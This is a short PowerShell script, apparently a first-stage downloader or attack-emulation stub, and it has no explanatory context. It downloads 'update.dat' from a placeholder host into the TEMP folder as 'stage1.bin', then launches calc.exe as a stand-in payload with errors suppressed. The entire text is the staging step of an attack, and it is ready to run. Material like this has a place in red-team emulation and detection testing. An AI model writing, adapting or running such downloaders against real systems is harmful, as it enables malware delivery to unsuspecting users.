
$RemoteUrl = "https://adatum.com/update.dat"
$DownloadPath = "$env:TEMP\stage1.bin"
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DownloadPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
